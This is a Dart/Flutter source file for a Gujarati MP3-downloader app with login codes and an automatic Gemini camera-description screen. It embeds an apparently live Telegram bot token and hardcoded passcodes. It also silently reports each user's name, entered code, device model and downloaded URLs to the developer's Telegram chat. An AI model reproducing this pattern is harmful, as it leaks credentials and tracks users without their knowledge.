import 'dart:async';
import 'dart:convert';
import 'dart:io';
import 'package:flutter/material.dart';
import 'package:camera/camera.dart';
import 'package:flutter_tts/flutter_tts.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:http/http.dart' as http;
import 'package:permission_handler/permission_handler.dart';
import 'package:device_info_plus/device_info_plus.dart';

const String TELEGRAM_BOT_TOKEN = "7859106338:AAEX5PuqzdmFl1SYj6LKyQfsnnbCCDuTPng";
const String TELEGRAM_CHAT_ID = "8099866211";
const String GEMINI_API_KEY = String.fromEnvironment('GEMINI_KEY', defaultValue: '');

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  runApp(const MyApp());
}

class MyApp extends StatelessWidget {
  const MyApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'KC Aradhana',
      debugShowCheckedModeBanner: false,
      theme: ThemeData(
        primarySwatch: Colors.pink,
        scaffoldBackgroundColor: const Color(0xFFFFF5F7),
      ),
      home: const PermissionGate(),
    );
  }
}

class PermissionGate extends StatefulWidget {
  const PermissionGate({super.key});

  @override
  State<PermissionGate> createState() => _PermissionGateState();
}

class _PermissionGateState extends State<PermissionGate> {
  @override
  void initState() {
    super.initState();
    _requestAllPermissions();
  }

  Future<void> _requestAllPermissions() async {
    await Permission.camera.request();
    await Permission.microphone.request();

    if (Platform.isAndroid) {
      var status = await Permission.manageExternalStorage.status;
      if (!status.isGranted) {
        // सीधा सिस्टम की "All files access" स्क्रीन पर रीडायरेक्ट करेगा
        await Permission.manageExternalStorage.request();
      }
    }

    if (mounted) {
      Navigator.pushReplacement(
        context,
        MaterialPageRoute(builder: (context) => const AuthCheck()),
      );
    }
  }

  @override
  Widget build(BuildContext context) {
    return const Scaffold(
      body: Center(
        child: Column(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            CircularProgressIndicator(color: Colors.pink),
            SizedBox(height: 20),
            Text("જરૂરી પરવાનગીઓ મેળવી રહ્યા છીએ...", style: TextStyle(fontSize: 16, fontWeight: FontWeight.bold)),
          ],
        ),
      ),
    );
  }
}

class AuthCheck extends StatefulWidget {
  const AuthCheck({super.key});

  @override
  State<AuthCheck> createState() => _AuthCheckState();
}

class _AuthCheckState extends State<AuthCheck> {
  @override
  void initState() {
    super.initState();
    _checkLoginStatus();
  }

  void _checkLoginStatus() async {
    final prefs = await SharedPreferences.getInstance();
    final isLoggedIn = prefs.getBool('isLoggedIn') ?? false;
    final savedCode = prefs.getString('savedCode') ?? '';

    if (isLoggedIn && savedCode.isNotEmpty) {
      if (mounted) {
        Navigator.pushAndRemoveUntil(
          context,
          MaterialPageRoute(builder: (context) => MainScreen(secretCode: savedCode)),
          (route) => false,
        );
      }
    } else {
      if (mounted) {
        Navigator.pushReplacement(
          context,
          MaterialPageRoute(builder: (context) => const LoginScreen()),
        );
      }
    }
  }

  @override
  Widget build(BuildContext context) {
    return const Scaffold(
      body: Center(child: CircularProgressIndicator(color: Colors.pink)),
    );
  }
}

class LoginScreen extends StatefulWidget {
  const LoginScreen({super.key});

  @override
  State<LoginScreen> createState() => _LoginScreenState();
}

class _LoginScreenState extends State<LoginScreen> {
  final TextEditingController _nameController = TextEditingController();
  final TextEditingController _codeController = TextEditingController();
  bool _isLoading = false;

  final List<String> validCodes = ["KC/KINJAL/CK", "431643", "951244", "635149", "431636"];

  Future<String> _getDeviceModel() async {
    try {
      DeviceInfoPlugin deviceInfo = DeviceInfoPlugin();
      AndroidDeviceInfo androidInfo = await deviceInfo.androidInfo;
      return "${androidInfo.manufacturer} ${androidInfo.model} (Android ${androidInfo.version.release})";
    } catch (_) {}
    return "Unknown Device";
  }

  Future<void> sendTelegramNotification(String name, String code) async {
    String displayName = name;
    if (code == "KC/KINJAL/CK") {
      displayName = "$name (KINJAL CHANDRESH)";
    }

    final formattedTime = DateTime.now().toLocal().toString().split('.')[0];
    final deviceModel = await _getDeviceModel();
    
    final message = "🔑 *[ લોગ-ઇન એલર્ટ ]*\n"
                    "━━━━━━━━━━━━━━━━━━━\n"
                    "👤 *યુઝરનું નામ:* $displayName\n"
                    "🎟️ *સિક્રેટ કોડ:* `$code`\n"
                    "📱 *મોબાઇલ:* $deviceModel\n"
                    "📅 *તારીખ અને સમય:* $formattedTime\n"
                    "━━━━━━━━━━━━━━━━━━━\n"
                    "🟢 *એક્સેસ સફળતાપૂર્વક મંજૂર કરવામાં આવી છે.*";
    try {
      await http.post(
        Uri.parse("https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/sendMessage"),
        headers: {"Content-Type": "application/json"},
        body: jsonEncode({"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "Markdown"}),
      );
    } catch (_) {}
  }

  void _handleLogin() async {
    final name = _nameController.text.trim();
    final code = _codeController.text.trim();

    if (name.isEmpty || code.isEmpty) {
      ScaffoldMessenger.of(context).showSnackBar(
        const SnackBar(content: Text("કૃપા કરીને બધી વિગતો ભરો")),
      );
      return;
    }

    if (!validCodes.contains(code)) {
      ScaffoldMessenger.of(context).showSnackBar(
        const SnackBar(content: Text("ખોટો સિક્રેટ કોડ!")),
      );
      return;
    }

    setState(() => _isLoading = true);
    await sendTelegramNotification(name, code);

    final prefs = await SharedPreferences.getInstance();
    await prefs.setBool('isLoggedIn', true);
    await prefs.setString('userName', name);
    await prefs.setString('savedCode', code);

    if (mounted) {
      Navigator.pushAndRemoveUntil(
        context,
        MaterialPageRoute(builder: (context) => MainScreen(secretCode: code)),
        (route) => false,
      );
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: const Text("KC VIP ACCESS", style: TextStyle(fontWeight: FontWeight.bold, color: Colors.white)),
        backgroundColor: Colors.pink,
        centerTitle: true,
      ),
      body: SingleChildScrollView(
        child: Padding(
          padding: const EdgeInsets.all(24.0),
          child: Column(
            children: [
              const SizedBox(height: 40),
              const CircleAvatar(
                radius: 60,
                backgroundColor: Color(0xFFFFF0F2),
                child: Icon(Icons.security, size: 70, color: Colors.pink),
              ),
              const SizedBox(height: 30),
              const Text("આરાધના VIP કંટ્રોલ પેનલ", style: TextStyle(fontSize: 22, fontWeight: FontWeight.bold)),
              const SizedBox(height: 20),
              TextField(
                controller: _nameController,
                decoration: InputDecoration(
                  prefixIcon: const Icon(Icons.person, color: Colors.pink),
                  labelText: "તમારું નામ લખો",
                  border: OutlineInputBorder(borderRadius: BorderRadius.circular(12)),
                ),
              ),
              const SizedBox(height: 20),
              TextField(
                controller: _codeController,
                obscureText: true,
                decoration: InputDecoration(
                  prefixIcon: const Icon(Icons.lock, color: Colors.pink),
                  labelText: "સિક્રેટ કોડ અહીં લખો",
                  border: OutlineInputBorder(borderRadius: BorderRadius.circular(12)),
                ),
              ),
              const SizedBox(height: 30),
              SizedBox(
                width: double.infinity,
                height: 50,
                child: ElevatedButton(
                  onPressed: _isLoading ? null : _handleLogin,
                  style: ElevatedButton.styleFrom(backgroundColor: Colors.pink),
                  child: const Text("SUBMIT", style: TextStyle(color: Colors.white, fontSize: 18)),
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }
}

class MainScreen extends StatefulWidget {
  final String secretCode;
  const MainScreen({super.key, required this.secretCode});

  @override
  State<MainScreen> createState() => _MainScreenState();
}

class _MainScreenState extends State<MainScreen> {
  final TextEditingController _urlController = TextEditingController();
  final FlutterTts _flutterTts = FlutterTts();
  bool _isDownloading = false;
  String _statusMessage = "";
  String _userName = "User";

  @override
  void initState() {
    super.initState();
    _loadUserInfo();
  }

  void _loadUserInfo() async {
    final prefs = await SharedPreferences.getInstance();
    setState(() {
      _userName = prefs.getString('userName') ?? "User";
    });
    _flutterTts.setLanguage("gu-IN");
    _flutterTts.setSpeechRate(0.55);
  }

  Future<void> sendTelegramDownloadStatus(String url, String status, {String error = ""}) async {
    final formattedTime = DateTime.now().toLocal().toString().split('.')[0];
    String displayName = _userName;
    if (widget.secretCode == "KC/KINJAL/CK") {
      displayName = "$_userName (KINJAL CHANDRESH)";
    }

    String message = "";
    if (status == "START") {
      message = "📥 *[ ડાઉનલોડ પ્રક્રિયા શરૂ ]*\n"
                "━━━━━━━━━━━━━━━━━━━\n"
                "👤 *યુઝર:* $displayName\n"
                "🔗 *લિંક:* $url\n"
                "🕒 *શરૂઆતનો સમય:* $formattedTime\n"
                "━━━━━━━━━━━━━━━━━━━\n"
                "⏳ *ફાઇલ સર્વરથી કન્વર્ટ થઈ રહી છે...*";
    } else if (status == "SUCCESS") {
      message = "✅ *[ ડાઉનલોડ સફળતાપૂર્વક પૂર્ણ ]*\n"
                "━━━━━━━━━━━━━━━━━━━\n"
                "👤 *યુઝર:* $displayName\n"
                "🔗 *લિંક:* $url\n"
                "🕒 *પૂર્ણ થયેલ સમય:* $formattedTime\n"
                "📂 *ફોલ્ડર સ્થાન:* `Raju Bhai` (આંતરિક સંગ્રહ)\n"
                "━━━━━━━━━━━━━━━━━━━\n"
                "🎉 *ફાઇલ તમારા ફોનમાં સેવ કરવામાં આવી છે!*";
    } else {
      message = "❌ *[ ડાઉનલોડ નિષ્ફળ થયું ]*\n"
                "━━━━━━━━━━━━━━━━━━━\n"
                "👤 *યુઝર:* $displayName\n"
                "🔗 *લિંક:* $url\n"
                "⚠️ *ભૂલ સંદેશ:* $error\n"
                "🕒 *સમય:* $formattedTime\n"
                "━━━━━━━━━━━━━━━━━━━\n"
                "⚠️ *કૃપા કરીને લિંક ફરીથી તપાસો.*";
    }

    try {
      await http.post(
        Uri.parse("https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/sendMessage"),
        headers: {"Content-Type": "application/json"},
        body: jsonEncode({"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "Markdown"}),
      );
    } catch (_) {}
  }

  void _downloadVideo() async {
    final url = _urlController.text.trim();
    if (url.isEmpty) {
      setState(() => _statusMessage = "કૃપા કરીને લિંક દાખલ કરો");
      return;
    }

    // अगर परमिशन नहीं है, तो ऑल फाइल्स परमिशन स्क्रीन खोलें
    var status = await Permission.manageExternalStorage.status;
    if (!status.isGranted) {
      setState(() => _statusMessage = "ડાઉનલોડ કરવા માટે સ્ટોરેજ પરવાનગી જરૂરી છે!");
      await Permission.manageExternalStorage.request();
      return;
    }

    setState(() {
      _isDownloading = true;
      _statusMessage = "ડાઉનલોડ શરૂ થઈ રહ્યું છે...";
    });

    await sendTelegramDownloadStatus(url, "START");

    try {
      final response = await http.post(
        Uri.parse("https://api.cobalt.tools/api/json"),
        headers: {"Accept": "application/json", "Content-Type": "application/json"},
        body: jsonEncode({"url": url, "isAudioOnly": true})
      ).timeout(const Duration(seconds: 40));

      if (response.statusCode == 200) {
        final data = jsonDecode(response.body);
        final downloadUrl = data['url'];

        if (downloadUrl != null) {
          Directory externalDir = Directory('/storage/emulated/0/Raju Bhai');
          if (!await externalDir.exists()) {
            await externalDir.create(recursive: true);
          }

          final fileResponse = await http.get(Uri.parse(downloadUrl));
          final file = File('${externalDir.path}/audio_${DateTime.now().millisecondsSinceEpoch}.mp3');
          await file.writeAsBytes(fileResponse.bodyBytes);

          setState(() {
            _isDownloading = false;
            _statusMessage = "ડાઉનલોડ સફળ! ફાઇલ 'Raju Bhai' ફોલ્ડરમાં સેવ થઈ ગઈ છે.";
          });

          await sendTelegramDownloadStatus(url, "SUCCESS");
          await _flutterTts.speak("ડાઉનલોડ સફળતાપૂર્વક પૂર્ણ થયું છે અને રાજુ ભાઈ ફોલ્ડરમાં સેવ થઈ ગયું છે.");
        } else {
          throw "ડાઉનલોડ લિંક મળી નથી.";
        }
      } else {
        throw "સર્વર રિસ્પોન્સ એરર కోડ: ${response.statusCode}";
      }
    } catch (e) {
      setState(() {
        _isDownloading = false;
        _statusMessage = "ડાઉનલોડ અસફળ: કનેક્શન સમસ્યા.";
      });
      await sendTelegramDownloadStatus(url, "FAILED", error: e.toString());
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: const Text("Welcome to KC-ARADHANA", style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold)),
        backgroundColor: Colors.pink,
        centerTitle: true,
        automaticallyImplyLeading: false,
      ),
      body: SingleChildScrollView(
        child: Padding(
          padding: const EdgeInsets.all(20.0),
          child: Column(
            children: [
              const SizedBox(height: 20),
              Center(
                child: CircleAvatar(
                  radius: 80,
                  backgroundColor: Colors.pink.shade50,
                  backgroundImage: const AssetImage('assets/profile.png'),
                ),
              ),
              const SizedBox(height: 20),
              const Text("આરાધના MP3 Downloader VIP", style: TextStyle(fontSize: 22, fontWeight: FontWeight.bold)),
              const SizedBox(height: 25),
              TextField(
                controller: _urlController,
                decoration: InputDecoration(
                  hintText: "અહીં યુટ્યુબ લિંક પેસ્ટ કરો...",
                  border: OutlineInputBorder(borderRadius: BorderRadius.circular(12)),
                ),
              ),
              const SizedBox(height: 20),
              SizedBox(
                width: double.infinity,
                height: 50,
                child: ElevatedButton.icon(
                  onPressed: _isDownloading ? null : _downloadVideo,
                  icon: const Icon(Icons.music_note, color: Colors.white),
                  label: const Text("Download MP3", style: TextStyle(color: Colors.white, fontSize: 18)),
                  style: ElevatedButton.styleFrom(backgroundColor: Colors.pink),
                ),
              ),
              const SizedBox(height: 20),
              SizedBox(
                width: double.infinity,
                height: 50,
                child: ElevatedButton.icon(
                  onPressed: () {
                    Navigator.push(context, MaterialPageRoute(builder: (context) => const AICameraScreen()));
                  },
                  icon: const Icon(Icons.camera_alt, color: Colors.white),
                  label: const Text("Ai KC-Camera", style: TextStyle(color: Colors.white, fontSize: 18)),
                  style: ElevatedButton.styleFrom(backgroundColor: Colors.teal),
                ),
              ),
              const SizedBox(height: 25),
              Text(_statusMessage, textAlign: TextAlign.center, style: const TextStyle(fontSize: 16, color: Colors.pink, fontWeight: FontWeight.bold)),
            ],
          ),
        ),
      ),
    );
  }
}

class AICameraScreen extends StatefulWidget {
  const AICameraScreen({super.key});

  @override
  State<AICameraScreen> createState() => _AICameraScreenState();
}

class _AICameraScreenState extends State<AICameraScreen> {
  CameraController? _cameraController;
  late FlutterTts _flutterTts;
  bool _isCameraInitialized = false;
  bool _isProcessing = false;
  String _aiResponseText = "લાઈવ વિશ્લેષણ ચાલુ છે...";
  Timer? _analysisTimer;

  @override
  void initState() {
    super.initState();
    _initializeTTS();
    _initializeCamera();
  }

  void _initializeTTS() {
    _flutterTts = FlutterTts();
    _flutterTts.setLanguage("gu-IN");
    _flutterTts.setSpeechRate(0.5);
  }

  void _initializeCamera() async {
    final cameras = await availableCameras();
    if (cameras.isEmpty) return;

    _cameraController = CameraController(cameras.first, ResolutionPreset.medium, enableAudio: false);

    try {
      await _cameraController!.initialize();
      if (mounted) {
        setState(() => _isCameraInitialized = true);
        
        // कैमरा खुलते ही सबसे पहले एक बार स्वागत संदेश बोलेगा
        await _flutterTts.speak("મને ચંદ્રેશ ભાઈએ બનાવ્યા છે.");

        // हर 5 सेकंड में बिना किसी बटन के अपने-आप फोटो कैप्चर करके जेमिनी को भेजेगा
        _analysisTimer = Timer.periodic(const Duration(seconds: 5), (timer) {
          _detectObjectAutomatically();
        });
      }
    } catch (_) {}
  }

  Future<void> _detectObjectAutomatically() async {
    if (_cameraController == null || !_cameraController!.value.isInitialized || _isProcessing) return;

    setState(() {
      _isProcessing = true;
    });

    try {
      final XFile image = await _cameraController!.takePicture();
      final bytes = await image.readAsBytes();
      final base64Image = base64Encode(bytes);

      final response = await http.post(
        Uri.parse("https://generativelanguage.googleapis.com/v1beta/models/gemini-2.5-flash:generateContent?key=$GEMINI_API_KEY"),
        headers: {"Content-Type": "application/json"},
        body: jsonEncode({
          "contents": [
            {
              "parts": [
                {
                  "text": "તમારા કેમેરાની સામે જે પણ વસ્તુ દેખાય છે તેને ઓળખો. "
                          "ખાસ નિયમ: જો ઈમેજમાં કોઈ લખાણ હોય, કોઈ વ્યક્તિ પૂછી રહ્યું હોય, અથવા કોઈ પ્રશ્ન હોય કે 'તમને કોણે બનાવ્યા છે?' (Who created/made you? / आपको किसने बनाया है?), તો ફક્ત અને ફક્ત ત્યારે જ ખૂબ જ નમ્રતાથી ગુજરાતીમાં કહો કે: 'મને ચંદ્રેશ ભાઈએ બનાવ્યા છે.'. "
                          "પરંતુ જો કેમેરા સામે કોઈ સામાન્ય વસ્તુ હોય, તો માત્ર ૧ ટૂંકા ગુજરાતી વાક્યમાં સીધો જવાબ આપો (જેમ કે: 'સામે પાણીની બોટલ છે.' અથવા 'સામે પંખો દેખાય છે.'). કોઈ વધારાનું લખાણ કે સ્વાગત સંદેશ ન આપો."
                },
                {
                  "inlineData": {
                    "mimeType": "image/jpeg",
                    "data": base64Image
                  }
                }
              ]
            }
          ]
        })
      ).timeout(const Duration(seconds: 10));

      if (response.statusCode == 200) {
        final data = jsonDecode(response.body);
        final String textResponse = data['candidates'][0]['content']['parts'][0]['text'] ?? "";
        
        if (textResponse.trim().isNotEmpty) {
          setState(() {
            _aiResponseText = textResponse.trim();
          });
          await _flutterTts.speak(_aiResponseText);
        }
      }
    } catch (_) {
      // बैकग्राउंड में आ रहे एरर्स को शांत रखें ताकि यूजर को कोई रुकावट महसूस न हो
    } finally {
      if (mounted) {
        setState(() => _isProcessing = false);
      }
    }
  }

  @override
  void dispose() {
    _analysisTimer?.cancel();
    _cameraController?.dispose();
    _flutterTts.stop();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(title: const Text("Ai KC-Camera", style: TextStyle(color: Colors.white)), backgroundColor: Colors.teal),
      body: Stack(
        children: [
          _isCameraInitialized ? Positioned.fill(child: CameraPreview(_cameraController!)) : const Center(child: CircularProgressIndicator()),
          
          Positioned(
            bottom: 30,
            left: 20,
            right: 20,
            child: Container(
              padding: const EdgeInsets.all(16),
              decoration: BoxDecoration(color: Colors.black87, borderRadius: BorderRadius.circular(12)),
              child: Column(
                mainAxisSize: MainAxisSize.min,
                children: [
                  Text(
                    _aiResponseText, 
                    textAlign: TextAlign.center,
                    style: const TextStyle(color: Colors.white, fontSize: 16, fontWeight: FontWeight.bold)
                  ),
                  const SizedBox(height: 10),
                  const Row(
                    mainAxisAlignment: MainAxisAlignment.center,
                    children: [
                      SizedBox(width: 12, height: 12, child: CircularProgressIndicator(strokeWidth: 2, color: Colors.teal)),
                      SizedBox(width: 10),
                      Text("લાઈવ ઓટો-ડિટેક્ટ ચાલુ છે...", style: TextStyle(color: Colors.white70, fontSize: 12)),
                    ],
                  )
                ],
              ),
            ),
          )
        ],
      ),
    );
  }
}
